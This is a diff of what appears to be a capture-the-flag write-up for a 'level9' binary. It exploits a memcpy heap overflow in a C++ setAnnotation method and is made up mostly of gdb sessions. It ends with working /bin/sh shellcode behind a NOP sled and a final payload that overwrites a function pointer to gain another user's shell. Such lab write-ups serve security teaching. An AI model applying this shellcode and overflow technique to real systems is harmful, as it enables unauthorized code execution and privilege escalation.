@@ -1,10 +1,122 @@
-The binary is in cpp.
-
-An N class is defined, it contains a function setAnnotation which copies a (char **), in our case, argv[1] using memcpy().
+The binary is in cpp.xw
 
 if argc() is 1, the program returns.
 0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
 
+memcpy() is called in _ZN1N13setAnnotationEPc.
 Let's use a buffer overflow for this case since memcpy() is used.
 
-(a finir <3)
+Let's find the offset.'`
+
+gdb --args level9 `python -c 'print "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ"'`
+
+(gdb) r
+Starting program: /home/user/level9/level9 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) i r
+eax            0x42424242       1111638594
+ecx            0x4a4a4a4a       1246382666
+edx            0x804a09c        134520988
+ebx            0x804a078        134520952
+esp            0xbffff660       0xbffff660
+ebp            0xbffff688       0xbffff688
+
+
+BBBB is written into eax which is offset 108.
+
+Let's inspect the end of the main function.
+
+(gdb) disas main
+0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
+0x0804867c <+136>:   mov    0x10(%esp),%eax
+0x08048680 <+140>:   mov    (%eax),%eax
+0x08048682 <+142>:   mov    (%eax),%edx
+0x08048684 <+144>:   mov    0x14(%esp),%eax
+0x08048688 <+148>:   mov    %eax,0x4(%esp)
+0x0804868c <+152>:   mov    0x10(%esp),%eax
+0x08048690 <+156>:   mov    %eax,(%esp)
+0x08048693 <+159>:   call   *%edx
+
+At main + 159, there is a call to *%edx.
+The goal here is to overwrite the content of *%edx.
+
+Let's inspect further.
+
+(gdb) b * 0x0804867c
+(gdb) c
+Continuing.
+Breakpoint 2, 0x0804867c in main ()
+(gdb) i r
+eax            0x804a00c        134520844
+(gdb) x/x $eax
+0x804a00c:      0x61616161
+(gdb) si
+0x08048680 in main ()
+(gdb) i r
+eax            0x804a078        134520952
+(gdb) x/x $eax
+0x804a078:      0x42424242
+
+We notice that :
+eax is equal to "aaaa" which is offset 0.
+eax is then equal to "BBBB" which is the offset of 108 found earlier.
+
+Single stepping again and inspecting eax : 
+(gdb) x/x $eax
+0x42424242:     Cannot access memory at address 0x42424242
+
+Payload should then look like : 4(address) + 104(padding) + 4(address)
+
+Let's use the same shellcode as before to run a shell :
+export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
+
+Then run the binary in gdb again to find the address of the NOP sled.
+(gdb) r
+Starting program: /home/user/level9/level9 
+Breakpoint 1, 0x080485f8 in main ()
+(gdb) x/100wx $esp
+0xbffff7e4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff7f4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff804:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff814:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff824:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff834:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff844:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff854:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff864:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff874:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff884:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff894:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff8a4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff8b4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff8c4:     0x90909090      0x90909090      0x90909090      0x90909090
+
+To conclude, we need to write 0xbffff854 instead of 'aaaa' in 0x804a00c.
+
+
+
+Payload : 
+./level9 $(python -c 'print "\x54\xf8\xff\xbf"+"B"*104+"\x0c\xa0\x04\x08"')
+
+We can check it works in gdb :
+gdb) r
+Starting program: /home/user/level9/level9 T���BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Breakpoint 1, 0x080485f8 in main ()
+(gdb) c
+Continuing.
+Breakpoint 2, 0x0804867c in main ()
+(gdb) i r
+eax            0x804a00c        134520844
+(gdb) x/x $eax
+0x804a00c:      0xbffff854
+(gdb) si
+0x08048680 in main ()
+(gdb) i r
+eax            0x804a078        134520952
+(gdb) x/x $eax
+0x804a078:      0x0804a00c
+
+$ whoami
+bonus0
